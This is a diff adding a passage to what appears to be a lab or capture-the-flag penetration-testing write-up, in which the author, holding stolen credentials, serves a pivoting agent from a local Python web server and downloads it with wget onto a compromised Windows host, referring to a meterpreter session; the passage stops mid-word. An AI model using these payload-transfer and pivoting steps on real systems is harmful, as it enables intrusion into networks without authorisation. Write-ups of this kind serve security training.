@@ -254,6 +254,19 @@ I have the credentials
 
 I now have credentials, but i still cannot reach the internal network
 
+Ill download both the linux proxy and the windows agent from the github releases
 
+```python
+❯❯❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+Ill start a web server on my machine
+
+```python
+PS C:\Utils> wget http://10.10.14.61/agent.exe -o agent.exe
+```
+
+Ill drop into a shell from my meterpreter ses
 
 
